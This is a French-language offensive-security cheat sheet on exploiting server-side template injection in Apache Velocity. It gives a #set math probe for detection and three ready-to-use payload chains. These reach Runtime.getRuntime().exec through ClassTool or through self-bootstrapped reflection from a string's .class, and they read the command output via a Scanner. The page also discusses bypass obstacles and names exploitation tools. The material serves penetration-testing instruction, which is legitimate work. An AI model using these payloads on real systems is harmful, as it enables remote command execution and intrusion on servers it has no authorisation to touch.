---
title: "Injection de template côté serveur Velocity"
description: "Exploiter la SSTI Apache Velocity : confirmation avec #set, et réflexion depuis une référence de classe via ClassTool vers Runtime.getRuntime().exec pour l'exécution de commande."
keywords:
  - SSTI Velocity
  - VelocityTools
  - ClassTool inspect
  - réflexion Runtime exec
---

# Velocity

Apache Velocity utilise des directives `#set` et des références `$`. Confirmez l'injection avec `#set($x = 7 * 7)$x` affichant `49` (et `${7*7}` lorsque le contexte l'évalue). Velocity n'a pas d'utilitaire d'exécution de commande propre, donc la RCE se construit en réfléchissant depuis un objet déjà en portée vers `java.lang.Runtime`.

La chaîne standard obtient un objet `Class`, chemine vers son classloader ou directement vers `Runtime`, et appelle `exec`. Lorsque le `ClassTool` de VelocityTools est disponible (exposé comme `$class` ou similaire), il fournit le point d'entrée de la réflexion :

```velocity
#set($e = "e")
#set($run = $class.inspect("java.lang.Runtime").type)
#set($i = $run.getRuntime().exec("id"))
$i
```

Sans référence d'outil, amorcez la chaîne à partir d'une chaîne de caractères que vous définissez vous-même avec `#set`, prenez son `.class`, et utilisez `forName` pour charger `Runtime` :

```velocity
#set($s = "")
#set($str = $s.class.forName("java.lang.Runtime"))
#set($rt = $str.getMethod("getRuntime",null).invoke(null,null))
$rt.exec("id")
```

Définir `$s` avec `#set($s = "")` garantit qu'un objet réel est en portée, au lieu de compter sur une référence de contexte qui peut ne pas exister. Pour lire la sortie de la commande (plutôt qu'un objet `Process` nu), reliez le `InputStream` du processus à un scanner, en réutilisant `$s.class` :

```velocity
#set($proc = $rt.exec("id"))
#set($is = $proc.getInputStream())
#set($scan = $s.class.forName("java.util.Scanner").getConstructor($s.class.forName("java.io.InputStream")).newInstance($is).useDelimiter("\A"))
$scan.next()
```

L'exploitabilité dépend moins du contexte qu'avec d'autres moteurs, car `#set($s = "")` permet au template de créer son propre objet et d'atteindre `.class` dessus ; le véritable obstacle pratique est un `SecurityManager` restreignant la réflexion, ou une configuration event-handler/uberspect qui bloque l'introspection de méthodes. Confirmez avec la sonde mathématique `#set`, puis essayez d'abord la forme `ClassTool` et repliez-vous sur la chaîne de réflexion auto-amorcée.

## Outils

- tplmap, SSTImap

## Références

- Documentation Apache Velocity et VelocityTools
- PortSwigger Web Security Academy: Server-side template injection
